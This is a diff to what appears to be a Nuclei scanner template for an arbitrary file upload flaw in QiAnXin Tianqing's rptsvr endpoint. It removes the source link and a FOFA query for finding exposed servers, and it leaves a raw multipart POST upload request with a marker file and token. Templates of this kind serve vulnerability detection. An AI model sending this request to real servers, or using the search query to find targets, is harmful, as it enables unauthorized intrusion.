@@ -3,12 +3,8 @@ info:
   name: 奇安信 天擎 rptsvr 任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/igmtcbg8o09fnrwn'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: igmtcbg8o09fnrwn
-    fofa: banner="QiAnXin web server" || banner="360 web server"  || body
 http:
 - raw:
   - 'POST /rptsvr/upload HTTP/1.1
@@ -32,8 +28,6 @@ http:
     Upgrade-Insecure-Requests: 1
 
 
-
-
     -----------------------------s3kwcmxrul2yyogjptcd
 
 
@@ -43,8 +37,6 @@ http:
     Content-Type: text/x-python
 
 
-
-
     dudesite
 
 
@@ -52,8 +44,6 @@ http:
 
 
     Content-Disposition: form-data; name="token"
-
-
 
 
     skylar_report
